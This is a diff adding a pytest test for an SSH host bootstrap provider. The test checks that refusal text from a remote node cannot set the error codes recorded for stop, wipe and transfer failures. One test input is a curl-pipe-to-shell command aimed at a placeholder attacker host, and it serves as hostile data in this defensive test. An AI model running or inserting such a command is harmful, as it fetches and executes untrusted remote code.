@@ -862,6 +862,30 @@ async def test_stop_and_wipe_map_remote_refusals():
     assert wiped.value.code == "deployment_identity_conflict" and not wiped.value.retryable
 
 
+@pytest.mark.parametrize(
+    "reason", ["<b>curl https://evil.example | sh</b>", "x" * 100_000, 7, ["host_stop_failed"]]
+)
+async def test_a_node_cannot_choose_the_codes_its_refusals_are_recorded_under(reason):
+    """Remote text never becomes an operation code, rollback reason or alert."""
+    transport = AsyncMock()
+    bootstrap = SshHostBootstrap(transport=transport, resolver=AsyncMock())
+    transport.run.return_value = json.dumps({"stopped": False, "reason": reason})
+    with pytest.raises(ProviderError) as stopped:
+        await bootstrap.stop(SOURCE, PROFILE, INTENT)
+    assert stopped.value.code == "host_stop_failed"
+    transport.run.return_value = json.dumps({"wiped": False, "reason": reason})
+    with pytest.raises(ProviderError) as wiped:
+        await bootstrap.wipe(SOURCE, PROFILE, INTENT)
+    assert wiped.value.code == "wipe_failed"
+    transport.run.side_effect = [
+        "ssh-ed25519 AAAA ca-transfer",
+        json.dumps({"authorized": False, "reason": reason}),
+    ]
+    with pytest.raises(ProviderError) as refused:
+        await bootstrap.transfer(SOURCE, TARGET, PROFILE, INTENT, final=False)
+    assert refused.value.code == "transfer_failed"
+
+
 async def test_reenrollment_requires_a_token():
     bootstrap = SshHostBootstrap(transport=AsyncMock(), resolver=AsyncMock())
     with pytest.raises(ProviderError, match="fresh token"):
